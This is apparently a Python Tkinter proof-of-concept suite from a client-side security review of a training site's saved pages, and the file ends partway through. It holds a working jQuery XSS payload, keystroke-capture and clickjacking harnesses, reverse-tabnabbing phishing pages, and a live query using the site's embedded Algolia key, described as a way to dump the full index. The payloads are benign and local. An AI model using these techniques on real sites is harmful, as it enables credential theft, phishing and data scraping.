#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HPA Client-Side Security Review - Proof-of-Concept Suite (Tkinter GUI)
=====================================================================

A presenter-friendly tool that demonstrates each documented finding (F-01..F-09)
from the static review of the supplied HTML/JavaScript files.

  *** AUTHORISED / EDUCATIONAL USE ONLY ***
  Use this only against assets you own or are explicitly authorised to test
  (e.g. a sanctioned engagement for the site's owner).

Safety model
------------
  * Every demonstration is LOCAL (reads the saved files in this folder, generates
    local HTML harnesses, opens them via a loopback-only web server) EXCEPT the
    Algolia tab (F-08).
  * All demo payloads are BENIGN: they show on-screen banners / display captured
    data locally. NOTHING is exfiltrated anywhere. Where a real attacker would
    steal data, the code says so in a comment instead of doing it.
  * F-08 (Algolia) defaults to a DRY-RUN that only prints the request/curl. A
    single, hard-capped live query is available behind an explicit confirmation,
    because the search key is public-by-design and querying it is what every
    visitor's browser already does - but you must be authorised.

Run:  python poc_suite_gui.py
"""

import functools
import http.server
import json
import os
import re
import socket
import socketserver
import threading
import urllib.request
import urllib.error
import webbrowser
from html.parser import HTMLParser

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ---- facts recovered from the supplied files (already public in their JS) ----
ALGOLIA_APP_ID = "MWM0VGEMN0"
ALGOLIA_SEARCH_KEY = "a19fb64b755e511f7574d6b0a2f7a107"
ALGOLIA_INDEX = "live_HPA"
ALGOLIA_REPLICAS = ["live_HPA_SortByTitleDesc"]

LOGIN = os.path.join(BASE_DIR, "login.html")
ADMIN = os.path.join(BASE_DIR, "admin.html")
INDEX = os.path.join(BASE_DIR, "index.html")
BUNDLE = os.path.join(BASE_DIR, "hpa-8529be3.js")

SEV_COLOR = {"HIGH": "#c0392b", "MEDIUM": "#d68910", "LOW": "#2e86c1", "INFO": "#566573"}

# --------------------------------------------------------------------------- #
#  Loopback-only static server (so harnesses can load ./hpa-8529be3.js etc.)
# --------------------------------------------------------------------------- #
_server = {"httpd": None, "port": None}


def ensure_server():
    if _server["httpd"]:
        return _server["port"]
    # find a free port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    Handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=BASE_DIR)

    class Quiet(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True

        def log_message(self, *a):  # noqa
            pass

    httpd = Quiet(("127.0.0.1", port), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    _server["httpd"] = httpd
    _server["port"] = port
    return port


def url_for(filename):
    return f"http://127.0.0.1:{ensure_server()}/{filename}"


def write_local(name, content):
    path = os.path.join(BASE_DIR, name)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(content)
    return path


def read_text(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    except OSError as e:
        return f"<<could not read {path}: {e}>>"


def hesc(s):
    return (s.replace("&", "&amp;").replace("<", "&lt;")
             .replace(">", "&gt;").replace('"', "&quot;"))


# --------------------------------------------------------------------------- #
#  F-01  jQuery <3.5 DOM-XSS (CVE-2020-11022) - deterministic proof + harness
# --------------------------------------------------------------------------- #
RXHTML_TAG = re.compile(
    r'<(?!area|br|col|embed|hr|img|input|link|meta|param)'
    r'(([a-z][^/\x00>\x20\t\r\n\f]*)[^>]*)/>', re.IGNORECASE)

XSS_PAYLOAD = ('<style><style /><img src="x" onerror="'
               "document.getElementById('out').innerHTML='&#x2620; XSS EXECUTED';"
               "document.getElementById('ck').textContent=document.cookie||'(none on localhost)';"
               "window.__XSS=1;\">")


class _Exec(HTMLParser):
    VOID = {"area", "br", "col", "embed", "hr", "img", "input", "link",
            "meta", "param", "source", "track", "wbr"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.stack, self.execs = [], []

    def _chk(self, tag, attrs):
        h = [k for k, _ in attrs if k.lower().startswith("on")]
        if h or tag == "script":
            self.execs.append((tag, h, list(self.stack)))

    def handle_starttag(self, tag, attrs):
        self._chk(tag, attrs)
        if tag not in self.VOID:
            self.stack.append(tag)

    def handle_startendtag(self, tag, attrs):
        self._chk(tag, attrs)

    def handle_endtag(self, tag):
        if tag in self.stack:
            while self.stack and self.stack.pop() != tag:
                pass


def _analyse(markup):
    d = _Exec()
    d.feed(markup)
    d.close()
    return d.execs


def demo_f01(log):
    log("Finding F-01 - jQuery <3.5 DOM-XSS (CVE-2020-11022/11023)\n")
    log("Vulnerable code path: hpa-8529be3.js ~line 36136 (jQuery.htmlPrefilter)\n\n")
    log("Attacker markup passed to a jQuery sink such as $(el).html(input):\n")
    log("  " + XSS_PAYLOAD + "\n\n")

    vuln = RXHTML_TAG.sub(r'<\1></\2>', XSS_PAYLOAD)
    patched = XSS_PAYLOAD
    log("[VULNERABLE jQuery <3.5] htmlPrefilter rewrites <style/> -> <style></style>:\n")
    log("  " + vuln + "\n")
    ve = _analyse(vuln)
    for t, h, parents in ve:
        where = "/".join(parents) if parents else "(document root - ACTIVE!)"
        log(f"   => EXECUTABLE <{t}> via {h}  parsed at: {where}\n")
    if not ve:
        log("   => inert\n")

    log("\n[PATCHED jQuery >=3.5] no rewrite, <img> stays inside <style> (inert):\n")
    pe = _analyse(patched)
    log("   => inert\n" if not pe else f"   => {pe}\n")

    log("\nVERDICT: " + ("CONFIRMED VULNERABLE - the bundled jQuery turns inert markup "
                         "into executing script.\n" if ve and not pe else "inconclusive\n"))
    log("Impact: script runs in an admin's browser on login.html/admin.html -> "
        "session cookie + SilverStripe SecurityID theft -> CMS takeover.\n")
    log("Fix: upgrade jQuery to >= 3.5.0, jQuery UI to >= 1.13.\n")


def demo_f01_browser(log):
    h = read_text(os.path.join(BASE_DIR, "_tpl")) if False else None  # noqa
    html = """<!doctype html><html><head><meta charset="utf-8">
<title>F-01 jQuery XSS - LOCAL PoC</title>
<style>body{font-family:Segoe UI,Arial;max-width:760px;margin:40px auto}
#out{font-size:22px;font-weight:bold;color:#c0392b}</style></head><body>
<h2>F-01 &mdash; jQuery &lt;3.5 DOM-XSS (loads the REAL local bundle)</h2>
<p>This page loads <code>./hpa-8529be3.js</code> to get the site's own
<code>$</code>, then runs <code>$('#sink').html(payload)</code>.</p>
<div id="out"></div>
<p>Status: <span id="st">loading bundle&hellip;</span></p>
<p>document.cookie seen by injected JS (local only): <code id="ck">-</code></p>
<div id="sink" style="display:none"></div>
<script src="./hpa-8529be3.js"></script>
<script>
var P = __PAYLOAD__;
function run(){var st=document.getElementById('st');
 if(!window.jQuery){st.innerHTML='window.$ not exposed by the bundle in this minimal '+
  'page (webpack bundle may need full page context). The CLI/deterministic proof still '+
  'confirms the flaw.';return;}
 st.textContent='bundle loaded; injecting via .html() ...';
 try{window.jQuery('#sink').html(P);
  setTimeout(function(){st.textContent = window.__XSS ?
   'VULNERABLE - attacker JS executed.' : 'payload did not execute (patched).';},400);
 }catch(e){st.textContent='error: '+e;}}
if(document.readyState==='complete')run();else window.addEventListener('load',run);
</script></body></html>"""
    html = html.replace("__PAYLOAD__", json.dumps(XSS_PAYLOAD))
    write_local("_poc_f01_xss.html", html)
    u = url_for("_poc_f01_xss.html")
    log(f"\nOpened browser PoC: {u}\n(loads the real local bundle; loopback only)\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-02  Missing SRI -> simulated compromised-CDN script injection
# --------------------------------------------------------------------------- #
def scan_scripts(path):
    txt = read_text(path)
    out = []
    for m in re.finditer(r'<script\b[^>]*\bsrc=["\']([^"\']+)["\'][^>]*>', txt, re.I):
        tag = m.group(0)
        src = m.group(1)
        has_integrity = "integrity=" in tag.lower()
        if src.startswith("http") or src.startswith("//"):
            out.append((src, has_integrity))
    return out


def demo_f02(log):
    log("Finding F-02 - No Subresource Integrity (SRI) on third-party scripts\n\n")
    for label, path in [("login.html", LOGIN), ("admin.html", ADMIN)]:
        scripts = scan_scripts(path)
        ext = [s for s in scripts if True]
        log(f"{label}: {len(ext)} externally-hosted <script src> tags; "
            f"{sum(1 for _,i in ext if i)} have integrity=\n")
        for src, integ in ext[:12]:
            log(f"   [{'SRI' if integ else 'NO SRI'}] {src}\n")
        if len(ext) > 12:
            log(f"   ... (+{len(ext)-12} more)\n")
        log("\n")
    log("=> Not one external script pins an integrity hash. If any of these CDNs is\n"
        "   compromised, the swapped-in JavaScript runs with full DOM access on the\n"
        "   login/admin pages (Magecart-style credential theft).\n\n")
    log("Click 'Simulate compromised CDN' to see benign attacker JS load WITHOUT any\n"
        "integrity check (it only shows a banner + a local keystroke display).\n")


def demo_f02_browser(log):
    evil = """// Stand-in for a script delivered by a COMPROMISED but trusted CDN.
// Benign: shows a banner and displays keystrokes locally. No exfiltration.
document.addEventListener('DOMContentLoaded',function(){
 var b=document.createElement('div');
 b.style.cssText='position:fixed;top:0;left:0;right:0;background:#c0392b;color:#fff;'+
  'font:bold 16px Segoe UI;padding:10px;z-index:9999';
 b.textContent='\\u2620 Compromised-CDN script executed (no SRI). A real one would now keylog & exfiltrate.';
 document.body.appendChild(b);
 var log=document.getElementById('keys');
 document.addEventListener('keydown',function(e){ if(log) log.textContent += e.key; });
});"""
    write_local("_poc_evil_cdn.js", evil)
    page = """<!doctype html><html><head><meta charset="utf-8"><title>F-02 SRI PoC</title>
<style>body{font-family:Segoe UI,Arial;max-width:760px;margin:70px auto}</style></head><body>
<h2>F-02 &mdash; Missing SRI: a swapped CDN script just ran</h2>
<p>The &lt;script&gt; below has <b>no integrity attribute</b>, so the browser runs
whatever the host returns - here, our stand-in "compromised" file.</p>
<p>Type into this box; a tampered script can read every keystroke:</p>
<input style="width:60%;padding:6px" placeholder="try typing a password...">
<p>Captured locally: <code id="keys"></code></p>
<script src="./_poc_evil_cdn.js"></script>
</body></html>"""
    write_local("_poc_f02_sri.html", page)
    u = url_for("_poc_f02_sri.html")
    log(f"\nOpened: {u}\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-03  Trackers / session recording on auth pages -> keystroke-capture demo
# --------------------------------------------------------------------------- #
THIRD_PARTY_HINTS = [
    ("Google Tag Manager", r"googletagmanager|gtm\.js|/coh4/"),
    ("Facebook/Meta Pixel", r"fbevents|connect\.facebook|705212672884340"),
    ("Hotjar (session recording)", r"hotjar"),
    ("Matomo", r"matomo|container_mwhfPt9i"),
    ("Ortto", r"cdn3l\.ink|ap3c"),
    ("Reddit Pixel", r"redditstatic|rdt\("),
    ("Convert A/B", r"10047999-10049486|window\.convert"),
    ("Identity/CDP cluster", r"identify_|events\.js|pixel\.js|main\.[A-Za-z0-9]+\.js"),
]


def demo_f03(log):
    log("Finding F-03 - Tracking & session-recording on login/admin pages\n\n")
    for label, path in [("login.html", LOGIN), ("admin.html", ADMIN)]:
        txt = read_text(path)
        present = [name for name, pat in THIRD_PARTY_HINTS if re.search(pat, txt, re.I)]
        log(f"{label} loads: {', '.join(present)}\n")
    log("\nSession-recording/analytics tools observe DOM + (unless masked) typed input.\n"
        "On a LOGIN page that can mean capturing the email + password fields.\n\n")
    log("Click 'Show what a recorder captures' for a local mock login whose 'recorder'\n"
        "displays everything you type (locally only - nothing is sent).\n")


def demo_f03_browser(log):
    page = """<!doctype html><html><head><meta charset="utf-8"><title>F-03 recorder PoC</title>
<style>body{font-family:Segoe UI,Arial;max-width:720px;margin:50px auto}
.col{display:flex;gap:30px}label{display:block;margin:8px 0 2px}
input{width:90%;padding:6px}.rec{background:#111;color:#0f0;font-family:Consolas;
padding:10px;min-height:120px;white-space:pre-wrap}</style></head><body>
<h2>F-03 &mdash; what a session recorder / tampered tracker sees</h2>
<div class="col">
 <form onsubmit="return false" style="flex:1">
  <h3>"Login"</h3>
  <label>Email</label><input id="e" autocomplete="off">
  <label>Password</label><input id="p" type="password" autocomplete="off">
  <button>Log in</button>
 </form>
 <div style="flex:1"><h3>Recorder feed (local)</h3><div id="r" class="rec"></div></div>
</div>
<script>
// Illustrative recorder. Benign: prints to the page. A real recorder/compromised
// tracker would stream this to a third party. We do NOT send anything.
var r=document.getElementById('r');
function hook(id,name){var el=document.getElementById(id);
 el.addEventListener('input',function(){r.textContent =
  r.textContent.split('\\n').filter(function(l){return l.indexOf(name+': ')!==0;}).join('\\n')
  + (r.textContent?'\\n':'') + name+': '+el.value;});}
hook('e','email');hook('p','password');
</script></body></html>"""
    write_local("_poc_f03_recorder.html", page)
    u = url_for("_poc_f03_recorder.html")
    log(f"\nOpened: {u}\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-04  Clickjacking - frame the LOCAL login page under a decoy overlay
# --------------------------------------------------------------------------- #
def demo_f04(log):
    log("Finding F-04 - Clickjacking (frame-busting commented out; headers unverified)\n\n")
    log("Evidence: hpa-8529be3.js ~line 91174 the iframe-busting redirect is commented out.\n")
    log("If no server-side X-Frame-Options / CSP frame-ancestors is sent, the page can be\n"
        "embedded in a transparent iframe over decoy UI to hijack clicks.\n\n")
    target = url_for("login.html")
    page = ("""<!doctype html><html><head><meta charset="utf-8"><title>F-04 clickjacking PoC</title>
<style>body{font-family:Segoe UI,Arial;margin:0}
.decoy{position:absolute;top:120px;left:60px;z-index:1;font-size:26px;color:#0a0;font-weight:bold}
.btn{position:absolute;top:200px;left:60px;z-index:1;padding:14px 22px;font-size:18px}
iframe{position:absolute;top:0;left:0;width:1100px;height:900px;opacity:0.25;z-index:2;border:0}
.note{position:fixed;bottom:0;left:0;right:0;background:#111;color:#fff;padding:8px;font-size:13px}
</style></head><body>
<div class="decoy">YOU'VE WON! Click CLAIM to get your free HPA course &darr;</div>
<button class="btn">CLAIM FREE COURSE</button>
<iframe src="__TARGET__"></iframe>
<div class="note">F-04 PoC: the faint page on top is the REAL local login.html framed at 25% opacity.
A victim aiming for "CLAIM" actually interacts with the framed login. Set opacity:0 to make it invisible.</div>
</body></html>""").replace("__TARGET__", target)
    write_local("_poc_f04_clickjack.html", page)
    u = url_for("_poc_f04_clickjack.html")
    log(f"Opened: {u}\n(frames the LOCAL login.html, not the live site)\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-05  Reverse tabnabbing
# --------------------------------------------------------------------------- #
def demo_f05(log):
    log("Finding F-05 - Reverse tabnabbing (target=_blank without rel=noopener)\n\n")
    n_blank = len(re.findall(r'target=["\']_blank["\']', read_text(LOGIN)))
    log(f"login.html has {n_blank} target=_blank links and 0 rel=noopener.\n\n")
    evil = """<!doctype html><html><head><meta charset="utf-8"><title>cute kittens</title></head>
<body style="font-family:Segoe UI;max-width:680px;margin:60px auto">
<h2>Thanks for visiting! \\u{1F431}</h2>
<p>Meanwhile, because the opener used target=_blank without rel="noopener",
this page can silently redirect the tab you came from...</p>
<script>
// Benign: redirect the OPENER tab to a local "phishing" lookalike (not a real site).
if(window.opener){ window.opener.location = "_poc_f05_phish.html"; }
</script></body></html>"""
    phish = """<!doctype html><html><head><meta charset="utf-8"><title>Session expired - sign in</title></head>
<body style="font-family:Segoe UI;max-width:520px;margin:80px auto">
<div style="background:#c0392b;color:#fff;padding:10px">F-05 PoC: your original tab was
silently replaced. A real attacker would show a pixel-perfect login clone here to phish you.</div>
<h2>Your session expired - please sign in again</h2>
<input placeholder="Email" style="width:90%;padding:6px;margin:6px 0">
<input placeholder="Password" type="password" style="width:90%;padding:6px;margin:6px 0">
<button>Sign in</button></body></html>"""
    opener = """<!doctype html><html><head><meta charset="utf-8"><title>F-05 opener</title></head>
<body style="font-family:Segoe UI;max-width:680px;margin:60px auto">
<h2>F-05 &mdash; Reverse tabnabbing</h2>
<p>This link mimics the site's external links (target=_blank, no rel=noopener).
Click it, then come back to THIS tab - it will have been redirected.</p>
<p><a href="_poc_f05_evil.html" target="_blank">Visit our partner &rarr;</a></p>
</body></html>"""
    # encode the emoji escape properly
    evil = evil.replace("\\u{1F431}", "\U0001F431")
    write_local("_poc_f05_evil.html", evil)
    write_local("_poc_f05_phish.html", phish)
    write_local("_poc_f05_opener.html", opener)
    u = url_for("_poc_f05_opener.html")
    log(f"Opened: {u}\nClick the link, then return to the opener tab.\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-06  Information disclosure scanner (read-only, local)
# --------------------------------------------------------------------------- #
def demo_f06(log):
    log("Finding F-06 - Information disclosure (recon harvested from local files)\n\n")
    patterns = [
        ("CMS / generator", LOGIN, r'<meta name="generator" content="([^"]+)"'),
        ("Mirror tool", INDEX, r'(HTTrack Website Copier/[\d.\- ]+)'),
        ("GTM container", LOGIN, r'(GTM-[A-Z0-9]+)'),
        ("Server-side GTM path", ADMIN, r"j\.src='(/[a-z0-9]+/)'"),
        ("Facebook Pixel ID", LOGIN, r"fbq\('init',\s*'(\d+)'"),
        ("Reddit Pixel", LOGIN, r'rdt\("init","([^"]+)"'),
        ("Matomo container", LOGIN, r'(container_[A-Za-z0-9]+)\.js'),
        ("Ortto token", LOGIN, r"ap3c\.init\('([^']+)'"),
        ("CDP data-id", ADMIN, r'data-id="([A-Z0-9]+)"'),
        ("Algolia App ID", BUNDLE, r"algoliaAppID\s*=\s*'([^']+)'"),
        ("Algolia Search Key", BUNDLE, r"algoliaSearchAPIKey\s*=\s*'([^']+)'"),
        ("Algolia index", BUNDLE, r"indexName\s*=\s*indexNamePrefix\s*\+\s*'(_HPA)'"),
    ]
    for label, path, pat in patterns:
        m = re.search(pat, read_text(path))
        log(f"  {label:24s}: {m.group(1) if m else '(not found)'}\n")
    log("\n=> Framework + tooling + service identifiers let an attacker fingerprint the\n"
        "   stack (target SilverStripe /admin, /Security) and abuse exposed IDs/keys.\n")


# --------------------------------------------------------------------------- #
#  F-07  DOM open-redirect (locale switcher) - local sink demo
# --------------------------------------------------------------------------- #
def demo_f07(log):
    log("Finding F-07 - DOM-based open redirect pattern\n\n")
    log("Sink (hpa-8529be3.js ~91170): the locale <select> does\n")
    log("    window.location.href = $(this).val();\n")
    log("If an option value is attacker-influenced, the browser navigates there.\n\n")
    page = """<!doctype html><html><head><meta charset="utf-8"><title>F-07 open redirect</title>
<style>body{font-family:Segoe UI;max-width:680px;margin:60px auto}</style></head><body>
<h2>F-07 &mdash; unvalidated navigation from a DOM value</h2>
<p>Same handler as the locale switcher. Here one option value is an attacker URL.
Changing the dropdown navigates straight to it (no allow-list check).</p>
<select id="loc">
 <option value="">-- choose --</option>
 <option value="_poc_f07_attacker.html">English</option>
 <option value="_poc_f07_attacker.html">Espanol</option>
</select>
<script>
document.getElementById('loc').addEventListener('change',function(){
 var v=this.value; if(v) window.location.href=v;   // the vulnerable pattern
});
</script></body></html>"""
    attacker = """<!doctype html><html><head><meta charset="utf-8"><title>attacker site</title></head>
<body style="font-family:Segoe UI;max-width:600px;margin:80px auto">
<div style="background:#c0392b;color:#fff;padding:10px">F-07 PoC: you were redirected by an
unvalidated location.href. A real attacker URL would be an external phishing page.</div>
</body></html>"""
    write_local("_poc_f07_attacker.html", attacker)
    write_local("_poc_f07_redirect.html", page)
    u = url_for("_poc_f07_redirect.html")
    log(f"Opened: {u}\nPick a language to see the redirect.\n")
    webbrowser.open(u)


# --------------------------------------------------------------------------- #
#  F-08  Algolia search-key abuse  (DRY-RUN default; opt-in single live query)
# --------------------------------------------------------------------------- #
def algolia_request_text():
    host = f"{ALGOLIA_APP_ID}-dsn.algolia.net"
    body = json.dumps({"params": "query=&hitsPerPage=5&page=0"})
    curl = (
        f"curl -X POST 'https://{host}/1/indexes/{ALGOLIA_INDEX}/query' \\\n"
        f"  -H 'X-Algolia-Application-Id: {ALGOLIA_APP_ID}' \\\n"
        f"  -H 'X-Algolia-API-Key: {ALGOLIA_SEARCH_KEY}' \\\n"
        f"  -H 'Content-Type: application/json' \\\n"
        f"  -d '{body}'"
    )
    return host, body, curl


def demo_f08_dry(log):
    log("Finding F-08 - Algolia search key abuse (DRY RUN - nothing sent)\n\n")
    log(f"  App ID : {ALGOLIA_APP_ID}     (public in hpa-8529be3.js)\n")
    log(f"  Key    : {ALGOLIA_SEARCH_KEY}  (search-only; shipped to every browser)\n")
    log(f"  Index  : {ALGOLIA_INDEX}   replicas: {', '.join(ALGOLIA_REPLICAS)}\n\n")
    host, body, curl = algolia_request_text()
    log("Equivalent request an attacker (or anyone) can send from outside the browser:\n\n")
    log(curl + "\n\n")
    log("Why the client should care:\n"
        "  * The 'public' key talks directly to the search backend from anywhere.\n"
        "  * One query returns nbHits = the TOTAL number of indexed records; an attacker\n"
        "    paginates (page=0..nbPages) to EXFILTRATE THE ENTIRE INDEX, including any\n"
        "    fields indexed but not shown in the UI.\n"
        "  * Unlimited automated queries inflate Algolia operation costs (billing abuse).\n"
        "  * It is read-only (cannot write/delete) - but data scraping + cost abuse remain.\n\n")
    log("Use 'SEND 1 LIVE QUERY' only if you are authorised. It sends exactly ONE bounded\n"
        "request (hitsPerPage=5) to prove the key works against the live index.\n")


def demo_f08_live(log, root):
    if not messagebox.askyesno(
            "Authorised live query?",
            "This sends ONE real search request to the client's LIVE Algolia index "
            f"({ALGOLIA_INDEX}) using their public search key.\n\n"
            "Only proceed if you are authorised to test this asset.\n\nSend one bounded query?"):
        log("\n[live query cancelled by user]\n")
        return

    def worker():
        host, body, _ = algolia_request_text()
        url = f"https://{host}/1/indexes/{ALGOLIA_INDEX}/query"
        req = urllib.request.Request(
            url, data=body.encode(), method="POST",
            headers={"X-Algolia-Application-Id": ALGOLIA_APP_ID,
                     "X-Algolia-API-Key": ALGOLIA_SEARCH_KEY,
                     "Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                data = json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            root.after(0, log, f"\n[HTTP {e.code}] {e.read()[:300]!r}\n")
            return
        except Exception as e:  # noqa
            root.after(0, log, f"\n[request failed: {e}]\n")
            return

        nb = data.get("nbHits", "?")
        pages = data.get("nbPages", "?")
        ms = data.get("processingTimeMS", "?")
        hits = data.get("hits", [])

        def show():
            log("\n=== LIVE RESPONSE (one bounded query) ===\n")
            log(f"  TOTAL records exposed (nbHits): {nb}\n")
            log(f"  nbPages: {pages}   processingTimeMS: {ms}\n")
            log(f"  -> an attacker would loop page=0..{pages} to dump all {nb} records.\n\n")
            if hits:
                keys = list(hits[0].keys())
                log(f"  Fields present on each record: {', '.join(keys)[:300]}\n\n")
                log("  First few records pulled with the 'public' key:\n")
                for h in hits[:5]:
                    title = (h.get("title") or h.get("name") or h.get("Title")
                             or h.get("post_title") or h.get("h1") or h.get("objectID"))
                    log(f"    - {str(title)[:110]}  (objectID={h.get('objectID')})\n")
            log("\n(One request only. No pagination/scrape was performed.)\n")
        root.after(0, show)

    log("\n[sending one live query...]\n")
    threading.Thread(target=worker, daemon=True).start()


# --------------------------------------------------------------------------- #
#  F-09  Sensitive-form hardening scanner (read-only, local)
# --------------------------------------------------------------------------- #
def demo_f09(log):
    log("Finding F-09 - Sensitive-form hardening (read-only scan)\n\n")
    for label, path in [("login.html", LOGIN), ("admin.html", ADMIN)]:
        txt = read_text(path)
        pw = re.findall(r'<input[^>]*type=["\']password["\'][^>]*>', txt, re.I)
        log(f"{label}: {len(pw)} password field(s)\n")
        for i, tag in enumerate(pw, 1):
            ac = "autocomplete=off" if re.search(r'autocomplete=["\']off', tag, re.I) else "NO autocomplete"
            log(f"   pw#{i}: {ac}\n")
        sids = sorted(set(re.findall(r'name="SecurityID"\s+value="([0-9a-f]+)"', txt)))
        log(f"   SecurityID value(s) in file: {sids if sids else '(none)'}\n\n")
    log("=> autocomplete handling is inconsistent across forms; verify SERVER-SIDE that\n"
        "   SecurityID (CSRF token) is per-session and rotated. The identical value here\n"
        "   is expected for a one-session static mirror (not proof of a fixed token).\n")


# --------------------------------------------------------------------------- #
#  Findings registry
# --------------------------------------------------------------------------- #
FINDINGS = [
    dict(id="F-01", sev="HIGH",
         title="jQuery <3.5 DOM-XSS (CVE-2020-11022)",
         desc="The bundled jQuery's htmlPrefilter (hpa-8529be3.js:36136) rewrites self-closing "
              "tags, promoting attacker markup that should be inert into executing script.",
         buttons=[("Run deterministic proof", lambda log, r: demo_f01(log)),
                  ("Open browser PoC (real bundle)", lambda log, r: demo_f01_browser(log))],
         fix="Upgrade jQuery >= 3.5.0 and jQuery UI >= 1.13."),
    dict(id="F-02", sev="MEDIUM",
         title="No Subresource Integrity (SRI)",
         desc="No external <script> pins an integrity hash. A compromised CDN can run arbitrary "
              "JS on the login/admin pages (Magecart).",
         buttons=[("List external scripts", lambda log, r: demo_f02(log)),
                  ("Simulate compromised CDN", lambda log, r: demo_f02_browser(log))],
         fix="Add integrity+crossorigin to static 3rd-party scripts; enforce a strict CSP."),
    dict(id="F-03", sev="MEDIUM",
         title="Trackers & session recording on auth pages",
         desc="Hotjar/Pixel/Matomo/Ortto/CDP load on login & admin. Recorders can capture typed "
              "credentials unless masked.",
         buttons=[("List trackers on auth pages", lambda log, r: demo_f03(log)),
                  ("Show what a recorder captures", lambda log, r: demo_f03_browser(log))],
         fix="Remove non-essential trackers from auth pages; mask sensitive inputs; CSP."),
    dict(id="F-04", sev="MEDIUM",
         title="Clickjacking (frame-busting disabled)",
         desc="The JS frame-buster is commented out (hpa-8529be3.js:~91174). If no XFO/CSP "
              "frame-ancestors header is set, the page can be framed for UI-redress.",
         buttons=[("Run clickjacking PoC (local page)", lambda log, r: demo_f04(log))],
         fix="Send Content-Security-Policy: frame-ancestors 'self' (and/or X-Frame-Options)."),
    dict(id="F-05", sev="LOW",
         title="Reverse tabnabbing",
         desc="target=_blank links lack rel=noopener; the opened page can redirect the original "
              "tab to a phishing clone via window.opener.",
         buttons=[("Run tabnabbing PoC (local)", lambda log, r: demo_f05(log))],
         fix="Add rel=\"noopener noreferrer\" to all target=_blank links."),
    dict(id="F-06", sev="LOW",
         title="Information disclosure",
         desc="Framework, mirror tool, and many service IDs/keys are exposed in the markup/JS, "
              "aiding reconnaissance.",
         buttons=[("Harvest disclosed info", lambda log, r: demo_f06(log))],
         fix="Remove generator meta; treat exposed IDs as public + rate-limit server-side."),
    dict(id="F-07", sev="LOW",
         title="DOM-based open redirect",
         desc="The locale switcher assigns window.location.href from a DOM value without an "
              "allow-list (hpa-8529be3.js:~91170).",
         buttons=[("Run open-redirect PoC (local)", lambda log, r: demo_f07(log))],
         fix="Validate navigation targets against a same-origin allow-list."),
    dict(id="F-08", sev="INFO",
         title="Algolia search-key abuse  (live-capable)",
         desc="The public search key + app ID + index (live_HPA) let anyone query the search "
              "backend directly: full index scraping + query-cost abuse.",
         buttons=[("Dry run (show request only)", lambda log, r: demo_f08_dry(log)),
                  ("SEND 1 LIVE QUERY (authorised)", lambda log, r: demo_f08_live(log, r))],
         fix="Apply Algolia key restrictions (rate limit, index scope, referer); secured keys."),
    dict(id="F-09", sev="INFO",
         title="Sensitive-form hardening gaps",
         desc="Inconsistent password autocomplete; CSRF SecurityID rotation must be verified "
              "server-side.",
         buttons=[("Scan login/admin forms", lambda log, r: demo_f09(log))],
         fix="Consistent autocomplete; verify per-session rotating CSRF tokens; no-store."),
]


# --------------------------------------------------------------------------- #
#  GUI
# --------------------------------------------------------------------------- #
class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HPA Security Review - PoC Suite (authorised use only)")
        self.geometry("1020x720")
        self._build_header()
        self._build_tabs()
        self._build_statusbar()

    def _build_header(self):
        head = tk.Frame(self, bg="#0f2942")
        head.pack(fill="x")
        tk.Label(head, text="HPA Client-Side Security Review - Proof-of-Concept Suite",
                 bg="#0f2942", fg="white", font=("Segoe UI", 14, "bold")).pack(anchor="w", padx=12, pady=(8, 0))
        warn = tk.Label(head,
                        text="AUTHORISED / EDUCATIONAL USE ONLY  -  all demos run locally; "
                             "payloads are benign; only F-08's live button touches the network.",
                        bg="#c0392b", fg="white", font=("Segoe UI", 9, "bold"))
        warn.pack(fill="x", padx=0, pady=(6, 0))

    def _build_tabs(self):
        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=8, pady=8)

        # About tab
        about = tk.Frame(nb)
        nb.add(about, text="About")
        txt = scrolledtext.ScrolledText(about, wrap="word", font=("Consolas", 10))
        txt.pack(fill="both", expand=True, padx=6, pady=6)
        txt.insert("1.0",
            "This suite demonstrates findings F-01..F-09 from the static review of the\n"
            "supplied HTML/JavaScript files (offline mirror of hpacademy.com).\n\n"
            "How to present:\n"
            "  1. Open a finding tab.\n"
            "  2. Read the description, click the demo button(s).\n"
            "  3. Browser-based PoCs open in your default browser via a loopback server.\n\n"
            "Safety:\n"
            "  - Everything is LOCAL except F-08's 'SEND 1 LIVE QUERY' (opt-in, one request).\n"
            "  - Payloads only show banners / display captured data on-screen. No exfiltration.\n"
            "  - Generated harness files are named _poc_*.html / _poc_*.js in this folder.\n\n"
            f"Working dir: {BASE_DIR}\n")
        txt.config(state="disabled")

        for f in FINDINGS:
            self._add_finding_tab(nb, f)

    def _add_finding_tab(self, nb, f):
        frame = tk.Frame(nb)
        nb.add(frame, text=f"{f['id']}")

        top = tk.Frame(frame)
        top.pack(fill="x", padx=8, pady=(8, 4))
        badge = tk.Label(top, text=f" {f['sev']} ", bg=SEV_COLOR[f["sev"]], fg="white",
                         font=("Segoe UI", 9, "bold"))
        badge.pack(side="left")
        tk.Label(top, text="  " + f["title"], font=("Segoe UI", 12, "bold")).pack(side="left")

        desc = tk.Label(frame, text=f["desc"], wraplength=960, justify="left", fg="#222")
        desc.pack(fill="x", padx=10, pady=(0, 6), anchor="w")

        btnbar = tk.Frame(frame)
        btnbar.pack(fill="x", padx=8)
        out = scrolledtext.ScrolledText(frame, wrap="word", font=("Consolas", 9), height=22)
        out.pack(fill="both", expand=True, padx=8, pady=8)

        def make_log(widget):
            def log(*parts):
                widget.insert("end", "".join(str(p) for p in parts))
